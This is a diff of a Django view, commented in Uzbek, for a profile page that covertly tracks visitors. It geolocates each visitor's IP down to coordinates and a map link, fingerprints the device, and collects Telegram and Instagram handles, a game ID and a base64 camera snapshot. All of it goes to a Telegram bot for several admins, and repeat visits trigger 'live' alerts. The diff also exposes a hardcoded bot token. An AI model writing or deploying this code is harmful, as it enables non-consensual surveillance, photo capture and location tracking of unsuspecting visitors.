@@ -6,48 +6,55 @@ from django.http import JsonResponse
 from .models import Profile
 from analytics.models import VisitorAnalytics, LinkClickAnalytics
 
-# BOT SOZLAMALARI
+# BOT SOZLAMALARI (Istalgancha admin ID qo'shishingiz mumkin)
 TELEGRAM_BOT_TOKEN = "8913375327:AAGDQ3YBplsSYUO7fPpugb557ZZc4y_MONw"
-TELEGRAM_ADMIN_CHAT_ID = "8389359853"
+TELEGRAM_ADMINS = ["8389359853","1724433674"]  # Bu yerga keyingi admin ID larni vergul bilan ajratib qo'shasiz
 
 def send_to_telegram_and_forget(text, image_data=None):
-    """Rasmni va ma'lumotni faqat Telegramga yuboradi, DBga umuman yozmaydi"""
+    """Xabarni ro'yxatdagi barcha adminlarga ketma-ket yuboradi, DBga yozmaydi"""
     base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
     
+    # Rasm formatini barcha adminlar uchun bir marta tayyorlab olamiz
+    photo_file_content = None
+    ext = "jpg"
     if image_data:
-        url = f"{base_url}/sendPhoto"
         try:
             format, imgstr = image_data.split(';base64,')
             ext = format.split('/')[-1]
-            photo_file = ContentFile(base64.b64decode(imgstr), name=f"visitor.{ext}")
-            
-            files = {'photo': photo_file}
-            payload = {'chat_id': TELEGRAM_ADMIN_CHAT_ID, 'caption': text, 'parse_mode': 'Markdown'}
-            requests.post(url, data=payload, files=files)
-            return
+            photo_file_content = base64.b64decode(imgstr)
         except Exception as e:
-            text += f"\n\n⚠️ _Rasmni Telegramga yuborishda xatolik yuz berdi: {e}_"
+            text += f"\n\n⚠️ _Rasmni qayta ishlashda xatolik yuz berdi: {e}_"
+            image_data = None  # Xato bo'lsa oddiy matn rejimiga o'tadi
 
-    url = f"{base_url}/sendMessage"
-    payload = {'chat_id': TELEGRAM_ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'}
-    requests.post(url, json=payload)
+    # Har bir admin uchun alohida so'rov yuboramiz
+    for admin_id in TELEGRAM_ADMINS:
+        try:
+            if image_data and photo_file_content:
+                url = f"{base_url}/sendPhoto"
+                # Har safar yangi ContentFile yaratish shart (oqim yopilib qolmasligi uchun)
+                photo_file = ContentFile(photo_file_content, name=f"visitor.{ext}")
+                files = {'photo': photo_file}
+                payload = {'chat_id': admin_id, 'caption': text, 'parse_mode': 'Markdown'}
+                requests.post(url, data=payload, files=files, timeout=3)
+            else:
+                url = f"{base_url}/sendMessage"
+                payload = {'chat_id': admin_id, 'text': text, 'parse_mode': 'Markdown'}
+                requests.post(url, json=payload, timeout=3)
+        except Exception as e:
+            # Agar biror admin botni bloklagan bo'lsa, qolganlarga borishini to'xtatmaydi
+            print(f"Admin {admin_id} ga xabar yuborishda xatolik: {e}")
 
 
 def profile_detail_view(request, profile_slug):
     profile = get_object_or_404(Profile, slug=profile_slug)
     links = profile.links.filter(is_active=True)
 
-    # 1. User-Agent orqali kirish manbasi va tizimni chuqurroq aniqlash
+    # 1. User-Agent orqali chuqur texnik tahlil
     user_agent_raw = request.META.get('HTTP_USER_AGENT', '')
     user_agent = user_agent_raw.lower()
     
-    # Ilova turi
-    if 'telegram' in user_agent:
-        source = "Telegram"
-    elif 'instagram' in user_agent:
-        source = "Instagram"
-    else:
-        source = "Tashqi Brauzer"
+    # Kirish manbasi
+    source = "Telegram" if 'telegram' in user_agent else "Instagram" if 'instagram' in user_agent else "Tashqi Brauzer"
 
     # Operatsion tizim (OS)
     if 'windows' in user_agent:
@@ -77,26 +84,19 @@ def profile_detail_view(request, profile_slug):
     else:
         browser = "Ichki/Boshqa Brauzer"
 
-    # Til sozlamasi
+    # Tizim tili
     user_lang = request.META.get('HTTP_ACCEPT_LANGUAGE', 'Aniqlanmadi').split(',')[0]
 
     # 2. IP manzilni olish
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')
 
-    # 3. IP orqali maksimal Geolokatsiya va Provayder ma'lumotlarini olish (API orqali)
+    # 3. IP orqali maksimal Geolokatsiya va Provayder ma'lumotlarini olish (API)
     geo_data = {
-        'country': 'Aniqlanmadi',
-        'city': 'Aniqlanmadi',
-        'isp': 'Aniqlanmadi',
-        'lat': 'Noma`lum',
-        'lon': 'Noma`lum'
+        'country': 'Aniqlanmadi', 'city': 'Aniqlanmadi', 'isp': 'Aniqlanmadi', 'lat': 'Noma`lum', 'lon': 'Noma`lum'
     }
-    
-    # Mahalliy test (127.0.0.1) bo'lmasa, APIga so'rov yuboramiz
     if ip and ip != '127.0.0.1':
         try:
-            # ip-api.com ochiq va bepul servisidan foydalanamiz
             response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=3)
             if response.status_code == 200:
                 data = response.json()
@@ -107,27 +107,33 @@ def profile_detail_view(request, profile_slug):
                     geo_data['lat'] = data.get('lat', 'Noma`lum')
                     geo_data['lon'] = data.get('lon', 'Noma`lum')
         except Exception:
-            pass # Tarmoq xatoligi bo'lsa, standart 'Aniqlanmadi' qiymati qoladi
+            pass
 
-    # AJAX (POST) so'rov kelsa (Foydalanuvchi ma'lumotlarini kiritganda)
+    # --- AJAX POST SO'ROV (Foydalanuvchi birinchi marta kirib formani to'ldirganda) ---
     if request.method == 'POST' and request.headers.get('X-Requested-With') == 'XMLHttpRequest':
-        visitor_user = request.POST.get('visitor_user', 'Anonim')
+        tg_user = request.POST.get('tg_user', '-')
+        insta_user = request.POST.get('insta_user', '-')
+        game_id = request.POST.get('game_id', '-')
         image_data = request.POST.get('image_data', None)
         status_text = request.POST.get('status_text', 'Ruxsat berilmadi')
-        screen_size = request.POST.get('screen_size', 'Noma`lum') # Front-enddan keladigan ekran o'lchami
+        screen_size = request.POST.get('screen_size', 'Noma`lum')
 
-        # BAZAGA FAQAT SHAXSIY BO'LMAGAN ANALITIKA YOZILADI
+        # Shaxsiy bo'lmagan analitikani bazaga saqlash
         VisitorAnalytics.objects.create(profile=profile, app_source=source)
 
-        # Sessiya orqali vaqtinchalik avto-login qilish
+        # Sessiya xotirasiga yozish (Keyingi safar formani ko'rsatmaslik uchun)
         request.session['is_logged_in'] = True
-        request.session['visitor_username'] = visitor_user
+        request.session['tg_user'] = tg_user
+        request.session['insta_user'] = insta_user
+        request.session['game_id'] = game_id
 
-        # Telegram bildirishnomasi (Barcha olingan ma'lumotlar jamlanmasi)
+        # Telegramga boradigan to'liq "Oshkor etish" xabari
         msg = (
-            f"🔔 *YANGI TASHRIF * \n\n"
+            f"🎯 *YANGI RO'YXATDAN O'TISH (Maksimal Detal)* \n\n"
             f"👤 *Maqsadli Profil:* {profile.title}\n"
-            f"🔑 *Kiritilgan Foydalanuvchi:* @{visitor_user}\n"
+            f"🔹 *Telegram:* @{tg_user}\n"
+            f"🔸 *Instagram:* @{insta_user}\n"
+            f"🆔 *Kiritilgan ID:* `{game_id}`\n"
             f"📸 *Kamera Holati:* {status_text}\n\n"
             
             f"📱 *QURILMA VA TIZIM:* \n"
@@ -142,26 +148,42 @@ def profile_detail_view(request, profile_slug):
             f"• *Provayder (ISP):* {geo_data['isp']}\n"
             f"• *Davlat:* {geo_data['country']}\n"
             f"• *Shahar:* {geo_data['city']}\n"
-            f"• *Koordinatalar:* {geo_data['lat']}, {geo_data['lon']}\n"
-            f"• *Xarita:* [Google Maps](https://www.google.com/maps/search/?api=1&query={geo_data['lat']},{geo_data['lon']})\n\n"
-            
+            f"• *Xarita:* [Google Maps](https://www.google.com/maps?q={geo_data['lat']},{geo_data['lon']})\n"
         )
-        
-        # Telegramga yuborish
         send_to_telegram_and_forget(msg, image_data=image_data)
-        
         return JsonResponse({'status': 'success'})
+
+    # --- ODDIY GET SO'ROV (Har safar profil ochilganda ishlaydi) ---
+    is_logged_in = request.session.get('is_logged_in', False)
+    if is_logged_in:
+        # Agar foydalanuvchi avval ro'yxatdan o'tgan bo'lsa, uning ma'lumotlari bilan "Qayta kirdi" smsi ketadi
+        saved_tg = request.session.get('tg_user', '-')
+        saved_insta = request.session.get('insta_user', '-')
+        saved_id = request.session.get('game_id', '-')
+        
+        re_visit_msg = (
+            f"🔄 *PROFILGA QAYTA KIRISH (Live Alert)* \n\n"
+            f"👤 *Profil:* {profile.title}\n"
+            f"旧 *Tanish Foydalanuvchi:* \n"
+            f"  • Telegram: @{saved_tg}\n"
+            f"  • Instagram: @{saved_insta}\n"
+            f"  • ID: `{saved_id}`\n\n"
+            f"📱 *Platforma:* {source} ({os_system} / {browser})\n"
+            f"🌐 *Joriy IP:* `{ip}`\n"
+            f"📍 *Joylashuv:* {geo_data['city']}, {geo_data['country']} ({geo_data['isp']})"
+        )
+        send_to_telegram_and_forget(re_visit_msg)
 
     context = {
         'profile': profile,
         'links': links,
-        'is_logged_in': request.session.get('is_logged_in', False)
+        'is_logged_in': is_logged_in
     }
     return render(request, 'profiles/index.html', context)
 
 
 def link_click_view(request, link_id):
-    """Tugma bosilganda bazada sonini oshiradi (Shaxsiy ma'lumotlarsiz)"""
+    """Tugma bosilganda bazada sonini oshiradi"""
     if request.method == 'POST' or request.headers.get('X-Requested-With') == 'XMLHttpRequest':
         LinkClickAnalytics.objects.create(link_id=link_id)
         return JsonResponse({'status': 'tracked'})
